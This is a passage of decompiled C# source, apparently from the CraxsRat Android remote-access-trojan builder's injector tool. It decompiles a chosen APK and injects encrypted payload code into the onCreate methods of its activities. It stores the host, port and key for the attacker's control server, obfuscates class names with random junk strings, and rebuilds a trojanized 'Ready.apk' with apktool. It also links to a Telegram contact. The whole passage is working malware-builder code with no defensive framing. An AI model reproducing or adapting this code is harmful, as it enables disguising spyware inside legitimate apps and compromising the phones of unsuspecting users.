						{
							array8[num9 + 1] = array8[num9 + 1] + Environment.NewLine + D(Resources.oncreatecode).Replace(D("W3RyZ3RtYWluXQ=="), newValue2);
							array8[array8.Length - 1] = array8[array8.Length - 1] + Environment.NewLine + Environment.NewLine + D(Decrypt(Resources.MainMith, TK)).Replace(D("W3RyZ3RtYWluXQ=="), newValue2).Replace("MainReflectorScan", N_ClassGen + "9").Replace("ClassGen", N_ClassGen);
							break;
						}
					}
					File.WriteAllLines(text9, array8);
				}
				int num10 = 2;
				string newValue3 = default(string);
				do
				{
					if (Directory.Exists(TheApkPath + "\\smali_classes" + num10))
					{
						smaliFolderPath = "smali_classes" + num10;
						foreach (string item4 in activityNames)
						{
							string text10 = Codes.FindActivityInSmali(TheApkPath, item4, smaliFolderPath);
							if (text10.Equals("pass", StringComparison.CurrentCultureIgnoreCase))
							{
								continue;
							}
							Console.WriteLine(text10);
							string[] array10 = File.ReadAllLines(text10);
							int num11 = array10.Length - 1;
							for (int num12 = 0; num12 <= num11; num12++)
							{
								if (num12 == 0)
								{
									string[] array11 = array10[0].Split(' ');
									newValue3 = array11[array11.Length - 1];
								}
								if (array10[num12].Contains(Decrypt("XqgovOgiwNmuEisbFkaXwA==", TK)) && array10[num12].ToLower().StartsWith(".method".ToLower()))
								{
									array10[num12 + 1] = array10[num12 + 1] + Environment.NewLine + D(Resources.oncreatecode).Replace(D("W3RyZ3RtYWluXQ=="), newValue3);
									array10[array10.Length - 1] = array10[array10.Length - 1] + Environment.NewLine + Environment.NewLine + D(Decrypt(Resources.MainMith, TK)).Replace(D("W3RyZ3RtYWluXQ=="), newValue3).Replace("MainReflectorScan", N_ClassGen + "9").Replace("ClassGen", N_ClassGen);
									break;
								}
							}
							File.WriteAllLines(text10, array10);
						}
					}
					num10++;
				}
				while (num10 <= 14);
			}
			if (CheckAutomatic.Checked)
			{
				log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "> Building Apk...");
				string text11 = WorkingDir + "\\out";
				outputapk = text11 + "\\Ready.apk";
				if (!Directory.Exists(text11))
				{
					Directory.CreateDirectory(text11);
				}
				ExecuteCommand("java -jar " + apktoolpath + " b -f " + TheApkPath + " -o " + outputapk);
			}
			else
			{
				log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "All Done Recompile Apk...");
			}
		}
	}

	public string Decrypt(string text, string password)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(text);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	public string madladstr()
	{
		return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(RandomShit(400, 1000), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandommMad(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandomShit(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandommMad(400, 1000)));
	}

	public object RandommMad(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[rshit.Next(0, text.Length - 1)]);
			}
			cou3++;
			return text2.ToString().ToLower() + Conversions.ToString(cou3);
		}
	}

	public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 2;
				_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r = new Random();
			}
			else if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init);
			}
		}
		int num = _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		for (int i = 1; i <= num2; i = checked(i + 1))
		{
			int startIndex = _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(0, text.Length);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	private bool CheckAllValuse()
	{
		if ((object)Host.Text != "" && (object)Port.Text != "" && (object)TheKey.Text != "")
		{
			if (CheckAutomatic.Checked)
			{
				if ((object)TargetApktext.Text != "")
				{
					return true;
				}
			}
			else if ((object)FolderPath.Text != "" && Activlist.Items.Count > 0)
			{
				return true;
			}
		}
		return false;
	}

	private void Port_TextChanged(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(Port.Text, "", TextCompare: false) != 0 && !Versioned.IsNumeric(Port.Text))
			{
				Port.Text = "";
				Interaction.MsgBox("Only Numbers");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			MySettingsProperty.Settings.inj_tnam = CLiname.Text;
			MySettingsProperty.Settings.inj_thost = Host.Text;
			MySettingsProperty.Settings.inj_tport = Port.Text;
			MySettingsProperty.Settings.inj_tkey = TheKey.Text;
			MySettingsProperty.Settings.Save();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string UpdateVersions(string inputXml)
	{
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.LoadXml(inputXml);
		XmlNode xmlNode = xmlDocument.SelectSingleNode("/manifest");
		if (xmlNode != null)
		{
			XmlAttribute xmlAttribute = xmlNode.Attributes["compileSdkVersion"];
			XmlAttribute xmlAttribute2 = xmlNode.Attributes["platformBuildVersionCode"];
			if (xmlAttribute != null && int.TryParse(xmlAttribute.Value, out var result) && result > 29)
			{
				xmlAttribute.Value = "29";
			}
			if (xmlAttribute2 != null && int.TryParse(xmlAttribute2.Value, out var result2) && result2 > 29)
			{
				xmlAttribute2.Value = "29";
			}
		}
		return xmlDocument.OuterXml;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Translateme();
		try
		{
			CLiname.Text = MySettingsProperty.Settings.inj_tnam;
			Host.Text = MySettingsProperty.Settings.inj_thost;
			Port.Text = MySettingsProperty.Settings.inj_tport;
			TheKey.Text = MySettingsProperty.Settings.inj_tkey;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			CLiname.Text = "Client1";
			Host.Text = "...";
			Port.Text = "7771";
			TheKey.Text = "TxTxT";
			ProjectData.ClearProjectError();
		}
	}

	private void Button4_Click_1(object sender, EventArgs e)
	{
	}

	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
		Close();
	}

	[DllImport("user32")]
	public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	private void DrakeUITitlePanel1_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void DrakeUITitlePanel2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ReleaseCapture();
			SendMessage(base.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
		}
	}

	private void Removeactiv_Click(object sender, EventArgs e)
	{
		if (Activlist.Items.Count > 0)
		{
			if (Activlist.SelectedItem != null)
			{
				Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(Activlist.SelectedItem));
			}
			else
			{
				CraxsAlert.Showinformation("Select Activity First");
			}
		}
		else
		{
			CraxsAlert.Showinformation("Activity List: 0");
		}
	}

	private void CheckAutomatic_MouseClick(object sender, MouseEventArgs e)
	{
		if (CheckAutomatic.Checked)
		{
			paneltargetfolder.Enabled = false;
			addactiv.Enabled = false;
			removeactiv.Enabled = false;
			panelactivitys.Enabled = false;
			Label6.Enabled = false;
			TargetApktext.Enabled = true;
			selectapkbtn.Enabled = true;
			labeltargetapp.Enabled = true;
			checkonlymain.Enabled = true;
			checkprotector.Enabled = true;
		}
		else
		{
			panelactivitys.Enabled = true;
			paneltargetfolder.Enabled = true;
			addactiv.Enabled = true;
			removeactiv.Enabled = true;
			Label6.Enabled = true;
			TargetApktext.Enabled = false;
			selectapkbtn.Enabled = false;
			labeltargetapp.Enabled = false;
			checkonlymain.Enabled = false;
			checkprotector.Enabled = false;
		}
	}

	private void Selectapkbtn_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = "C:\\";
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			TargetApktext.Text = "";
		}
		else
		{
			TargetApktext.Text = openFileDialog.FileName;
		}
	}
}
